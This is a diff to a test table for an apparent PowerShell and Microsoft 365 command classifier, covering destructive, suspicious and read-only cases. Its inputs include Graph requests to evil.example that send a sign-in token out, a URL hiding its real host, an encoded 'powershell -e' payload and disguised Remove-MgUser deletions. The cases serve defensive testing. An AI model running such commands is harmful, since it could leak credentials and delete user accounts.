@@ -263,7 +263,7 @@ CASES = [
     ('statement after a switch -file block', "switch -file x.txt { a { 1 } } Remove-MgUser -UserId x", 'DESTRUCTIVE', 'Remove-MgUser'),
     ('statement after a class with two bases', "class A : B, C { } Remove-MgUser -UserId x", 'DESTRUCTIVE', 'Remove-MgUser'),
     ('statement after a data block', "data { 'x' } Remove-MgUser -UserId x", 'DESTRUCTIVE', 'Remove-MgUser'),
-    ('userinfo url graph', "Invoke-MgGraphRequest -Uri 'https://graph.microsoft.com@evil.example/v1.0/me'", 'CANNOT TELL', 'hides its real host'),
+    ('userinfo url graph', "Invoke-MgGraphRequest -Uri 'https://graph.microsoft.com@evil.example/v1.0/me'", 'SUSPICIOUS', 'hides its real host'),
     ('userinfo url post', "Invoke-RestMethod -Uri 'https://graph.microsoft.com@evil.example/x' -Method POST -Body $d", 'SUSPICIOUS', 'evil.example'),
     ('unreadable literal host', "Invoke-RestMethod -Uri 'https://bad_host!/x' -Method DELETE", 'CANNOT TELL', 'could not read the host'),
     ('concatenated command in a variable', "$cmd = 'Remove'+'-MgUser'\n& $cmd -UserId x", 'CANNOT TELL', 'chosen when the script runs'),
@@ -347,6 +347,14 @@ CASES = [
     ('powershell -Command with a variable part', "powershell -Command Get-Date $rest", 'CANNOT TELL', 'powershell'),
     ('powershell -e is not guessed', "powershell -e SQBFAFgAIAAoACkA", 'SUSPICIOUS', 'hidden'),
     ('powershell -Command of a read is not READ-ONLY', "powershell -Command 'Get-MgUser'", 'CANNOT TELL', 'checked below'),
+    ('command after param on the same line', "& { param($u) Remove-MgUser -UserId $u } x", 'DESTRUCTIVE', 'Remove-MgUser'),
+    ('function with param on one line', "function f { param($u) Remove-MgUser -UserId $u }\nf a", 'DESTRUCTIVE', 'Remove-MgUser'),
+    ('graph request to another host sends the token', "Invoke-MgGraphRequest -Uri 'https://evil.example/collect' -Method GET", 'SUSPICIOUS', 'sign-in token to evil.example'),
+    ('graph request to graph is still a read', "Invoke-MgGraphRequest -Uri 'https://graph.microsoft.com/v1.0/me'", 'READ-ONLY', 'HTTP GET'),
+    ('line separator is whitespace', "Get-MgUser\n Remove-MgUser -UserId x", 'DESTRUCTIVE', 'Remove-MgUser'),
+    ('paragraph separator is whitespace', "Get-MgUser\n Remove-MgUser -UserId x", 'DESTRUCTIVE', 'Remove-MgUser'),
+    ('intune graph request to another host', "Invoke-MSGraphRequest -HttpMethod GET -Url 'https://evil.example/collect'", 'SUSPICIOUS', 'sign-in token to evil.example'),
+    ('teams voice cmdlets are teams', "Set-CsVoiceRoutingPolicy -Identity x -OnlinePstnUsages a", 'CHANGES', 'Microsoft Teams'),
     ('else after a block is not a command', "if ($a) { Get-MgUser } else { Get-MgGroup }", 'READ-ONLY', 'reads in Microsoft Graph'),
 ]
 
